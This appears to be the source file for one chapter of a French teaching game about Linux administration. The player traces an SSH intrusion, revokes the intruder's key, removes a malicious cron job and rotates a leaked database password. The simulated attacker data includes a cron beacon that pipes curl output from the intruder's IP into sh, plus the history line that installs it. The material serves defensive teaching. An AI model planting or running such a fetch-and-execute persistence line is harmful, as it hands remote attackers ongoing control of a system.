// Histoire « L'Audit » — chapitre « Les traces » : troisième partie du
// rapport de Salomé. Dans le journal de ssh, une connexion du compte de Nadia,
// dans la nuit du 13 mars à 3 h 12, depuis une adresse (203.0.113.99) qu'elle
// ne connaît pas : « Je dormais, et ma clé n'est que sur l'ordinateur de la
// boutique. » Remonter la trace, puis nettoyer :
//   - journalctl -u ssh, last : qui, quand, d'où, avec quelle clé (l'empreinte
//     est dans le journal) ;
//   - sudo ssh-keygen -l -f ~nadia/.ssh/authorized_keys : laquelle des deux
//     clés a cette empreinte. Le commentaire (« nadia@portable ») ne prouve
//     rien : seule l'empreinte compte ;
//   - retirer cette clé, et seulement elle (Nadia doit pouvoir entrer) ;
//   - chercher ce que l'intrus a laissé : une tâche cron de Nadia
//     (sudo crontab -u nadia -l) qui rappelle son serveur toutes les dix
//     minutes, à retirer sans emporter la vraie tâche (sauvegarde.sh).
//   - l'historique de Nadia montre aussi que l'intrus a lu /srv/commandes/.env
//     (à l'époque lisible par tous : « Le rapport ») : le mot de passe de la
//     base est compromis. Le changer pour de vrai, des deux côtés : dans
//     PostgreSQL (ALTER ROLE … PASSWORD, avec sudo -u postgres psql) ET dans
//     .env, puis relancer l'appli (elle lit .env au démarrage).
// Pièges réels : effacer tout authorized_keys (Nadia enfermée dehors),
// crontab -r (la sauvegarde disparaît aussi), se fier au commentaire de la
// clé, changer le mot de passe d'un seul côté (l'appli ne se reconnecte plus
// au redémarrage), un mot de passe trop court ou inchangé.
// Objectif vérifié sur l'état : la clé intruse retirée et celle de Nadia
// gardée, la tâche de l'intrus retirée et la sauvegarde gardée, un nouveau
// mot de passe de base assez long, le même dans PostgreSQL et dans .env,
// et l'appli relancée avec lui.
// Sources : https://man.openbsd.org/ssh-keygen, https://man.openbsd.org/sshd,
// https://man7.org/linux/man-pages/man5/crontab.5.html,
// https://man7.org/linux/man-pages/man1/last.1.html,
// https://www.postgresql.org/docs/current/sql-alterrole.html

import { d, f, joueur, type Chapitre } from '../world';
import { postgres, type EtatPostgres } from '../postgres';
import type { Jeu } from '../shell';
import { empreinteDeCle } from '../machines';
import type { Regle } from '../firewall';
import { nouveauPareFeu } from '../firewall';
import { nouveauSystemd, systemd } from '../systemd';
import type { Ecoute } from '../commands/ss';
import { chargerSshd, CLES, comptesFournil, fichier, journalSsh, M, MAINTENANT, MOT_DE_PASSE, mondeFournil, serviceSsh } from './audit';

const INTRUS = '203.0.113.99';
const BOUTIQUE = '198.51.100.7';
const CLES_NADIA = '/home/nadia/.ssh/authorized_keys';
const SAUVEGARDE = '0 4 * * * /srv/commandes/bin/sauvegarde.sh';
// Ce que l'intrus a laissé : toutes les dix minutes, un programme venu de chez lui.
const BALISE = `*/10 * * * * curl -fsS http://${INTRUS}/b | sh`;
const CRONTAB_NADIA = `# m h  dom mon dow   command\n${SAUVEGARDE}\n${BALISE}`;

const ANCIEN_MOT_DE_PASSE = 'brioche-beurre-91';
const ENV = '/srv/commandes/.env';
const urlBase = (mdp: string) => `DATABASE_URL=postgres://commandes:${mdp}@localhost:5432/commandes`;
const ENV_CONTENU = `PORT=3000\n${urlBase(ANCIEN_MOT_DE_PASSE)}\nREDIS_URL=redis://localhost:6379`;
// Ce que l'intrus a tapé, dans l'historique du compte de Nadia.
const HISTORIQUE = `id\ncat ${ENV}\ncrontab -l\n(crontab -l; echo '${BALISE}') | crontab -\nexit`;

const jour = (jourDuMois: number, h: number, m: number, s = 0) => Date.UTC(2028, 2, jourDuMois, h, m, s);

const corps = (cle: string) => cle.split(' ')[1];
const lignes = (texte: string | null) => (texte ?? '').split('\n').filter((l) => l.trim());
const cles = (j: Jeu) => lignes(j.lire(CLES_NADIA));
const cleIntruse = (j: Jeu) => cles(j).some((l) => corps(l) === corps(CLES.inconnue));
const cleNadia = (j: Jeu) => cles(j).some((l) => corps(l) === corps(CLES.nadia));
const crontab = (j: Jeu) => lignes((j.etat.crontabs as Record<string, string> | undefined)?.nadia ?? null).filter((l) => !l.startsWith('#'));
const baliseLaissee = (j: Jeu) => crontab(j).some((l) => l.includes(INTRUS));
const sauvegardeGardee = (j: Jeu) => crontab(j).some((l) => /sauvegarde\.sh/.test(l));
const motDePasseDeLaBase = (j: Jeu) => postgres(j)?.motsDePasse?.commandes ?? '';
const motDePasseDuFichier = (j: Jeu) => /^DATABASE_URL=postgres:\/\/commandes:([^@]*)@/m.exec(j.lire(ENV) ?? '')?.[1] ?? '';
// L'appli lit .env quand elle démarre : le mot de passe qu'elle utilise est celui du dernier démarrage.
const motDePasseDeLAppli = (j: Jeu) => (j.etat.appMotDePasse as string | undefined) ?? '';
const appliActive = (j: Jeu) => systemd(j)!.services.commandes.etat === 'active';
const changeBase = (j: Jeu) => motDePasseDeLaBase(j) !== ANCIEN_MOT_DE_PASSE;
const assezLong = (j: Jeu) => motDePasseDeLaBase(j).length >= 12;
const accord = (j: Jeu) => motDePasseDuFichier(j) === motDePasseDeLaBase(j);
const motDePasseOk = (j: Jeu) => changeBase(j) && assezLong(j) && accord(j) && appliActive(j) && motDePasseDeLAppli(j) === motDePasseDeLaBase(j);
const clesOk = (j: Jeu) => !cleIntruse(j) && cleNadia(j);
const cronOk = (j: Jeu) => !baliseLaissee(j) && sauvegardeGardee(j);

const ECOUTE: Ecoute[] = [
  { proto: 'tcp', adresse: '0.0.0.0', port: 22, processus: 'sshd', pid: 612 },
  { proto: 'tcp', adresse: '0.0.0.0', port: 80, processus: 'nginx', pid: 701 },
  { proto: 'tcp', adresse: '0.0.0.0', port: 443, processus: 'nginx', pid: 701 },
  { proto: 'tcp', adresse: '127.0.0.1', port: 5432, processus: 'postgres', pid: 744 },
  { proto: 'tcp', adresse: '127.0.0.1', port: 6379, processus: 'redis-server', pid: 760 },
  { proto: 'tcp', adresse: '127.0.0.1', port: 3000, processus: 'node', pid: 731 },
];
// Le pare-feu du chapitre précédent : SSH, 80 et 443.
const REGLES: Regle[] = [
  { action: 'allow', vers: 'OpenSSH', ports: [22], de: null },
  { action: 'allow', vers: 'Nginx Full', ports: [80, 443], de: null },
];

export const traces: Chapitre = {
  id: 'traces',
  numero: 4,
  commandes: [
    'ls',
    'cd',
    'pwd',
    'cat',
    'less',
    'head',
    'tail',
    'grep',
    'find',
    'nano',
    'sudo',
    'id',
    'whoami',
    'who',
    'last',
    'ps',
    'crontab',
    'ssh-keygen',
    'psql',
    'systemctl',
    'journalctl',
  ],
  maison: M,
  accueil: 'courriel_salome.txt',
  noms: true,
  final: 'fin',
  etapes: ['trouve', 'cle-identifiee', 'cle-revoquee', 'cron-decouvert', 'cron-nettoye', 'secret-vu', 'mot-de-passe', 'fin'],
  motDePasse: MOT_DE_PASSE,
  comptes: () => {
    const c = comptesFournil(false);
    c.utilisateurs.postgres = { uid: 115, groupe: 'postgres', maison: '/var/lib/postgresql', shell: '/bin/bash' };
    c.groupes.postgres = { gid: 122, membres: [] };
    return c;
  },
  etat: (t) => ({
    sshd: { charge: {}, connexionsAuChargement: 1, recharges: 0 },
    ufw: { ...nouveauPareFeu(), actif: true, regles: REGLES.map((r) => ({ ...r })) },
    ecoute: ECOUTE.map((e) => ({ ...e })),
    crontabs: { nadia: CRONTAB_NADIA },
    connexionsPassees: [
      { compte: 'nadia', tty: 'pts/1', depuis: BOUTIQUE, debut: jour(9, 18, 2), fin: jour(9, 18, 40) },
      { compte: 'nadia', tty: 'pts/1', depuis: BOUTIQUE, debut: jour(10, 17, 55), fin: jour(10, 18, 20) },
      { compte: 'nadia', tty: 'pts/2', depuis: INTRUS, debut: jour(13, 3, 12), fin: jour(13, 3, 15) },
      { compte: 'nadia', tty: 'pts/1', depuis: BOUTIQUE, debut: jour(13, 18, 2), fin: jour(13, 18, 31) },
      { compte: joueur(t), tty: 'pts/0', depuis: '192.0.2.2', debut: MAINTENANT - 60_000, fin: null },
    ],
    systemd: nouveauSystemd('fournil', MAINTENANT - 9 * 86_400_000, MAINTENANT, {
      ssh: serviceSsh(),
      nginx: { description: 'A high performance web server and a reverse proxy server', active: true, executable: 'nginx' },
      cron: { description: 'Regular background program processing daemon', active: true, executable: 'cron' },
      postgresql: { description: 'PostgreSQL RDBMS', active: true, executable: 'postgres' },
      commandes: {
        description: 'Fournil orders (commandes)',
        active: true,
        executable: 'node',
        processus: [{ pid: 731, utilisateur: 'commandes', cpu: 0.8, mem: 3.1, commande: '/usr/bin/node /srv/commandes/app/server.js' }],
        // L'appli lit .env au démarrage et se connecte à la base avec ce mot de passe.
        verifier: (j) =>
          motDePasseDuFichier(j) === motDePasseDeLaBase(j) ? null : ['error: password authentication failed for user "commandes"', "    at Parser.parseErrorMessage (/srv/commandes/app/node_modules/pg-protocol/dist/parser.js:283:98) { code: '28P01' }"],
        charger: (j) => {
          j.etat.appMotDePasse = motDePasseDuFichier(j);
        },
      },
    }),
    postgres: {
      bases: { postgres: { proprio: 'postgres', tables: {} }, commandes: { proprio: 'commandes', tables: {} } },
      roles: ['postgres', 'commandes'],
      archives: {},
      motsDePasse: { commandes: ANCIEN_MOT_DE_PASSE },
    } satisfies EtatPostgres,
    // Le démarrage d'avant la nuit du 13 mars : l'appli tourne avec l'ancien mot de passe.
    appMotDePasse: ANCIEN_MOT_DE_PASSE,
  }),
  // Le journal de ssh : les connexions de Nadia, celle de la nuit, les robots.
  initialiser: (j) => {
    chargerSshd(j);
    const nadia = empreinteDeCle(CLES.nadia);
    const intruse = empreinteDeCle(CLES.inconnue);
    const accepte = (h: number, pid: number, compte: string, adresse: string, port: number, empreinte: string, fin?: number) => {
      journalSsh(j, h, pid, `Accepted publickey for ${compte} from ${adresse} port ${port} ssh2: ED25519 ${empreinte}`);
      journalSsh(j, h + 1000, pid, `pam_unix(sshd:session): session opened for user ${compte}(uid=${compte === 'nadia' ? 1001 : 1000}) by (uid=0)`);
      if (fin) journalSsh(j, fin, pid, `pam_unix(sshd:session): session closed for user ${compte}`);
    };
    journalSsh(j, jour(8, 2, 14), 1511, 'Invalid user admin from 198.51.100.23 port 40112');
    accepte(jour(9, 18, 2), 1702, 'nadia', BOUTIQUE, 50412, nadia, jour(9, 18, 40));
    accepte(jour(10, 17, 55), 1788, 'nadia', BOUTIQUE, 50871, nadia, jour(10, 18, 20));
    journalSsh(j, jour(12, 22, 31), 1920, 'Connection closed by authenticating user root 192.0.2.201 port 33870 [preauth]');
    accepte(jour(13, 3, 12), 2104, 'nadia', INTRUS, 52144, intruse, jour(13, 3, 15));
    accepte(jour(13, 18, 2), 2310, 'nadia', BOUTIQUE, 50933, nadia, jour(13, 18, 31));
  },
  creerMonde: (t) =>
    mondeFournil(t, {
      sansLucas: true,
      maison: { 'courriel_salome.txt': f(t('traces-courriel-salome')) },
      plus: {
        srv: d(
          {
            commandes: d(
              { '.env': f(ENV_CONTENU, { lignes: true, proprio: 'commandes', groupe: 'commandes', mode: 'rw-------' }) },
              undefined,
              { proprio: 'commandes' },
            ),
          },
          undefined,
          { proprio: 'root' },
        ),
      },
      ssh: { 'sshd_config.d': d({ '00-hardening.conf': fichier('PermitRootLogin no', 'root') }, undefined, { proprio: 'root' }) },
      maisons: {
        nadia: d(
          {
            '.bash_history': f(HISTORIQUE, { lignes: true, proprio: 'nadia', mode: 'rw-------' }),
            '.ssh': d(
              { authorized_keys: f([CLES.nadia, CLES.inconnue].join('\n'), { lignes: true, proprio: 'nadia', mode: 'rw-------' }) },
              undefined,
              { proprio: 'nadia', mode: 'rwx------' },
            ),
          },
          undefined,
          { proprio: 'nadia', mode: 'rwx------' },
        ),
      },
    }),
  evenements: [
    {
      id: 'trouve',
      condition: (j) => j.derniere.commandes.some((c) => ['journalctl', 'last', 'grep'].includes(c[0])) && j.derniere.sortie.includes(INTRUS),
      message: (j) => j.t('traces-evenement-trouve', { adresse: INTRUS }),
    },
    {
      id: 'cle-identifiee',
      condition: (j) => j.derniere.commandes.some((c) => c[0] === 'ssh-keygen') && j.derniere.sortie.includes(empreinteDeCle(CLES.inconnue)),
      message: (j) => j.t('traces-evenement-cle-identifiee'),
    },
    { id: 'nadia-enfermee', condition: (j) => !cleNadia(j), message: (j) => j.t('traces-evenement-nadia-enfermee') },
    { id: 'cle-revoquee', condition: clesOk, message: (j) => j.t('traces-evenement-cle-revoquee') },
    {
      id: 'cron-decouvert',
      condition: (j) => j.derniere.commandes.some((c) => c[0] === 'crontab') && j.derniere.sortie.includes(INTRUS),
      message: (j) => j.t('traces-evenement-cron-decouvert'),
    },
    { id: 'sauvegarde-perdue', condition: (j) => !sauvegardeGardee(j), message: (j) => j.t('traces-evenement-sauvegarde-perdue') },
    { id: 'cron-nettoye', condition: cronOk, message: (j) => j.t('traces-evenement-cron-nettoye') },
    {
      id: 'secret-vu',
      condition: (j) => j.derniere.sortie.includes(`cat ${ENV}`),
      message: (j) => j.t('traces-evenement-secret-vu'),
    },
    {
      id: 'mot-de-passe-faible',
      condition: (j) => changeBase(j) && !assezLong(j),
      message: (j) => j.t('traces-evenement-mot-de-passe-faible'),
    },
    {
      id: 'a-redemarrer',
      condition: (j) => changeBase(j) && assezLong(j) && accord(j) && appliActive(j) && motDePasseDeLAppli(j) !== motDePasseDeLaBase(j),
      message: (j) => j.t('traces-evenement-a-redemarrer'),
    },
    {
      id: 'appli-tombee',
      condition: (j) => !appliActive(j) && !accord(j),
      message: (j) => j.t('traces-evenement-appli-tombee'),
    },
    { id: 'mot-de-passe', condition: motDePasseOk, message: (j) => j.t('traces-evenement-mot-de-passe') },
    { id: 'fin', condition: (j) => clesOk(j) && cronOk(j) && motDePasseOk(j), message: (j) => j.t('traces-evenement-fin') },
  ],
};
